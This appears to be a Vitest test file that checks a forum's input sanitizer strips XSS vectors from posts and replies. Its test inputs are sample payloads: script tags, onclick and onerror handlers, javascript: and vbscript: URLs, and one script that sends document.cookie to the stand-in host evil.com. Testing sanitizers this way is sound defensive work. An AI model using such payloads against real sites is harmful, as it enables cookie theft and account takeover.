/**
 * Tests for forum content sanitization.
 * Verifies that script tags and event handlers are stripped from forum post/reply content.
 */

import { describe, it, expect } from "vitest";
import { sanitizeInput } from "./_core/security";

describe("sanitizeInput - forum content protection", () => {
  it("strips <script> tags from content", () => {
    const malicious = '<script>alert(1)</script>Hello world';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert(1)');
    expect(result).not.toContain('</script>');
  });

  it("strips inline event handlers (onclick)", () => {
    const malicious = '<a onclick="stealCookies()">Click me</a>';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('stealCookies');
  });

  it("strips onerror event handlers", () => {
    const malicious = '<img onerror="alert(document.cookie)" src="x">';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert(');
  });

  it("strips javascript: protocol", () => {
    const malicious = '<a href="javascript:alert(1)">link</a>';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('javascript:');
  });

  it("strips vbscript: protocol", () => {
    const malicious = '<a href="vbscript:msgbox(1)">link</a>';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('vbscript:');
  });

  it("preserves safe plain text content", () => {
    const safe = "Hello, this is a normal forum post about regenerative farming.";
    const result = sanitizeInput(safe);
    // The function escapes HTML entities - check the core text is preserved
    expect(result).toContain("Hello");
    expect(result).toContain("regenerative farming");
  });

  it("handles nested script tags", () => {
    const malicious = 'Before<script>var x="</script>After<script>alert(1)</script>End';
    const result = sanitizeInput(malicious);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert(1)');
  });
});

describe("sanitizeInput - applied to forum createPost/createReply", () => {
  it("removes script injection from a post title", () => {
    const title = 'My Post <script>alert("xss")</script>';
    const sanitized = sanitizeInput(title);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert(');
  });

  it("removes script injection from a reply content", () => {
    const content = 'Great post! <script>document.location="https://evil.com?c="+document.cookie</script>';
    const sanitized = sanitizeInput(content);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.location');
  });
});
